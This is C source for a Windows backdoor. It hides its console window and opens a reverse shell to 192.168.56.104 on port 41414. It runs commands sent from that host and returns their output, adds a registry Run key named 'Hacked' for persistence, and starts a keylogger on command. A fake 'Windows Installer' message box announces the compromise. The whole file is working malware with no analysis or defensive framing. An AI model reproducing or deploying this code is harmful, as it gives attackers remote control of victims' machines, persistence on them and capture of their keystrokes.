#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "logger.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

int bootRun() {
	char err[128] = "Failed\n";
	char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if(pathLen == 0) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	HKEY NewVal;
	if(RegOpenKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if(RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	RegCloseKey(NewVal);
	send(sock, suc, sizeof(suc), 0);
	return 0;
}

char *str_cut(char str[], int slice_from, int slice_to) {
	if(str[0] == '\0')
		return NULL;
	char *buffer;
	size_t str_len, buffer_len;
	if(slice_to < 0 && slice_from > slice_to) {
		str_len = strlen(str);
		if(abs(slice_to) > str_len - 1)
			return NULL;
		if(abs(slice_from) > str_len)
			slice_from = (-1) * str_len;
		buffer_len = slice_to - slice_from;
		str += (str_len + slice_from);
	}
	else if(slice_from >= 0 && slice_to > slice_from) {
		str_len = strlen(str);
		
		if(slice_from > str_len - 1)
			return NULL;
		buffer_len = slice_to - slice_from;
		str += slice_from;
	}
	else
		return NULL;
	buffer = calloc(buffer_len, sizeof(char));
	strncpy(buffer, str, buffer_len);
	return buffer;
}

void Shell() {
	char buffer[1024];
	char container[1024];
	char total_response[18384];
	while(1) {
		jump:
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, sizeof(buffer), 0);
		if(strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if(strncmp("cd ", buffer, 3) == 0) {
			chdir(str_cut(buffer, 3, 100));
		}
		else if(strncmp("persist", buffer, 7) == 0) {
			bootRun();
		}
		else if(strncmp("keylog_start", buffer, 12) == 0) {
			HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
			goto jump;
		}
		else {
			FILE *fp;
			fp = _popen(buffer, "r");
			while(fgets(container, sizeof(container), fp) != NULL) {
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;
	ServIP = "192.168.56.104";
	ServPort = 41414;
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);
	}
	sock = socket(AF_INET, SOCK_STREAM, 0);
	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);
	start:
	while(connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
		Sleep(10);
		goto start;
	}
	MessageBox(NULL, TEXT("System Has Been Hacked!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
	Shell();
}

/* b64 ******************************************************************************

static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};

char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length) {

    *output_length = 4 * ((input_length + 2) / 3);

    char *encoded_data = malloc(*output_length);
    if (encoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (int i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';

    return encoded_data;
}


unsigned char *base64_decode(const char *data,
                             size_t input_length,
                             size_t *output_length) {

    if (decoding_table == NULL) build_decoding_table();

    if (input_length % 4 != 0) return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;

    unsigned char *decoded_data = malloc(*output_length);
    if (decoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        uint32_t triple = (sextet_a << 3 * 6)
        + (sextet_b << 2 * 6)
        + (sextet_c << 1 * 6)
        + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}


void build_decoding_table() {

    decoding_table = malloc(256);

    for (int i = 0; i < 64; i++)
        decoding_table[(unsigned char) encoding_table[i]] = i;
}


void base64_cleanup() {
    free(decoding_table);
}

b64 ****************************************************************************** */